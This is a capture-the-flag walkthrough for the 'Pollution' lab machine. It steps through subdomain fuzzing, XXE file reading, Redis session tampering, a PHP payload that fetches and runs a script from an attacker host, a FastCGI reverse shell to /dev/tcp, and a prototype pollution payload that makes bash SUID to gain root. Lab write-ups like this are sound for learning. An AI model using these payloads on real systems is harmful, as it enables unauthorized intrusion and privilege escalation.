Start with a nmap scan and subdomain discovery
# nmap -sC -sV <ip> -o nmap.pollution.htb
# ffuf -u http://collect.htb -H "Host:FUZZ.collect.htb" -w /home/user/Extra-tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw 11803

Subdomains found:
 * forum.collect.htb
 * developers.collect.htb

The developers subdomain requiers a user and password so let's move on to forum.collect.htb

In this subdomain there is a post that contain a file named 'proxy_history.txt'.
Inside this file there's a part that contains a base64 encoded http request to 'http://collect.htb/set/role/admin'
decode it and make another POST request using the 'token' to set the user u registerd on 'http://collect.htb' to have admin privileges 

# token=ddac62a28254561001277727cb397baf

After that register the user to get admin and capture the http request in burp suite (it will also help us to get root privileges later)

Now the next thing to do is an xxe you can read more here: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities
using the "file.dtd" we will get rce.
There is a redis password that can be used in ../bootstrap.php

## ini_set('session.save_handler','redis');
## ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

And a password that can be used to log in the developers subdomain in /var/www/developers/.htpasswd 
the password is inside the hash.txt file and it's already cracked

After getting access to the developers subdomain we still gotta pass another log in field and for that we are using redis.

# redis-cli -h collect.htb
# > auth COLLECTR3D1SPASS
# > keys *
Decipher any cookie and analyze the content
# > get (ANY-COOKIE)

Now add to the cookie that the subdomain gave us the following thing:
## auth|s:1:\"a\";
# > set (YOUR-COOKIE) (THE HOLE THING THE COOKIE ALREADY HAVE + THE PART ABOVE)
Refresh the page and now you are logged in :)

To get a shell we will use php_filter_chain making the machine access a file that is going to be hosted on a server we get controll
Using the next payload and setting a nc listener on our machine
# <?= `wget -O - <attacker-ip>/l|bash` ?>
# nc -lvnp 9090

The server is using 'fastcgi'
# ps aux
# tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
So we can exploit this using the fpm.py file and creating a blank file in the /tmp/ directory
And again setting another nc listener to get user privileges cause it didn't have a ssh 'public_key' to use
# python3 fpm.py -c '<?php system("sh -i >& /dev/tcp/IP/PORT 0>&1"); exit; ?>' 127.0.0.1 /tmp/file.php

Now for the root part there is a file with a prototype pollution vulnerability in the /home/victor/pollution-api directory
(pollution-api/controllers/Messages_send.js)
For more info check: 
https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation

Checking the /pollution-api/models/db.js file we see a password and db to use and here is where the user we registerd earlier
We will make it admin and then use this prototype pollution vulnerabilitie to give root privileges to /usr/bin/bash executable
Inside the machine as victor user:
# curl http://127.0.0.1:3000/auth/login -H "content-type: application/json" -d '{"username":"user","password":"user"}'
# curl http://127.0.0.1:3000/admin/messages/send -H "x-access-token: <token>" -H "content-type: application/json" -d '{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'
# /usr/bin/bash -p
And that's it, now you have root privileges ;)
 

Tools Used:
	* php_filter_chain_generator By synacktiv
